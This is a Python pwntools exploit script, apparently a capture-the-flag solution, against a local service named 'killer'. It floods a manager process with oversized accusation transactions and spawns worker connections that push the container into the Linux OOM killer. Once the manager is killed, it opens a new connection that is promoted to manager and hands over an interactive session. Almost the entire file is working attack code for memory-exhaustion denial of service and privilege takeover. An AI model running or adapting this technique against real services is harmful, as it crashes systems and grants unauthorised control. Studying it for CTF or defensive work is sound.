
from pwn import *
import time
import os

context.log_level = 'debug'


IP = "localhost"
PORT = 4242
SSL_NEEDED = False

WORKER_SIZE_MB = 50
MANAGER_SIZE_MB = 64
ARREST_SIZE_BYTES = 2400  
MAX_ACCUSATIONS_PER_ARREST = 2048
MEMORY_PER_MAX_ARREST = 2048 * ARREST_SIZE_BYTES
CONTAINER_MEM_LIMIT_MB = 256  



ACCUSATIONS= b'A,'*2047 + b'A'  # 2048 accusations, last one without comma -> will be expanded in 2048 HR-77A forms

def spawn_workers(num_workers, connections_array, worker_size_bytes): 
    for i in range(num_workers):
        p = remote(IP, PORT, timeout=5, ssl=SSL_NEEDED)
        fill_worker(p, f"worker_{i}".encode(), f"surname_{i}".encode(), worker_size_bytes)
        dump_memory_usage()
        connections_array.append(p)

def dump_memory_usage():
    command = "ps aux | grep /usr/local/bin/killer | grep -v grep | awk '{printf \"PID: %s RSZ: %.2f MB CMD: %s\\n\", $2, $6/1024, $11}'"
    print("-----------Memory usage----------")
    os.system(command)
    print("-------------------------------------")


def fill_worker(p, name, surname,size):
    accusations = size // ARREST_SIZE_BYTES
    print(f"Filling worker with {accusations} accusations")
    arrests= accusations // MAX_ACCUSATIONS_PER_ARREST
    print(f"Filling worker with {arrests} arrests")
    for i in range(arrests):
        try:
            p.recvuntil(b"> ")
            p.sendline(b"1") 
            p.recvuntil(b"> ")
            p.sendline(name+b"_"+str(i).encode())
            p.recvuntil(b"> ")
            p.sendline(surname+b"_"+str(i).encode())  
            p.recvuntil(b"> ")
            p.sendline(b"HR-77A")
            p.recvuntil(b"> ")
            p.sendline(ACCUSATIONS)
        except EOFError:
            print("EOFError encountered in fill_worker")
    


def fill_manager(n_transactions):
    p = remote(IP, PORT, timeout=5, ssl=SSL_NEEDED)
    dump_memory_usage()
    print(f"Filling manager with {n_transactions} transactions")
    for j in range(n_transactions):
        p.recvuntil(b"> ")
        p.sendline(b"1")
        p.recvuntil(b"> ")
        p.sendline(b"killer:"+str(j).encode())
        p.recvuntil(b"> ")
        p.sendline(b"Surname")
        p.recvuntil(b"> ")
        p.sendline(b"HR-77A") 
        p.recvuntil(b"> ")
        p.sendline(ACCUSATIONS)  
        p.recvuntil(b"> ")
        p.sendline(b"3")  # Commit transaction
        print(f"committing transaction {j+1}/{n_transactions}")
        dump_memory_usage()
    p.recvuntil(b"> ")
    p.sendline(b"4")  
    p.close()  

exploit_start = time.time()
n_transactions = (MANAGER_SIZE_MB * 1024 * 1024) // (ARREST_SIZE_BYTES * MAX_ACCUSATIONS_PER_ARREST)
print(f"Estimated transactions to fill manager: {n_transactions}")


fill_manager(n_transactions)

processes_array = []

# invoke OOM killer with workers
# WORKER_SIZE_MB < MANAGER_SIZE_MB 

n_workers = 4
print(f"Spawning {n_workers} workers to trigger OOM killer")
spawn_workers(n_workers, processes_array, (WORKER_SIZE_MB * 1024 * 1024))  
time.sleep(5) # Wait for memory to be allocated and OOM killer to be invoked

print(f"Closing workers")
# Close all workers to make sure the OOM killer is not invoked again against our new manager
for p in processes_array:
    try:
        p.recvuntil(b"> ")
        p.sendline(b".") 
        p.recvuntil(b"> ")
        p.sendline(b"4")  # Exit the program
        dump_memory_usage()
    except EOFError:
        print("EOFError encountered while exiting worker process")
    except Exception as e:
        print(f"Unexpected error: {e}")

# create a worker that will be upgraded to manager
# perform a simple transaction to trigger the upgrade
p = remote(IP, PORT, timeout=5,ssl=SSL_NEEDED)
p.recvuntil(b"> ")
p.sendline(b"1")  
p.recvuntil(b"> ")
p.sendline(b"last_killer")
p.recvuntil(b"> ")
p.sendline(b"last_surname")
p.recvuntil(b"> ")
p.sendline(b"SKC-24F")
p.recvuntil(b"> ")
p.sendline(b"murder")
p.recvuntil(b"> ")
p.sendline(b".")
p.recvuntil(b"> ")
p.sendline(b"3")
print("Exploit completed in", time.time() - exploit_start, "seconds")
p.interactive()


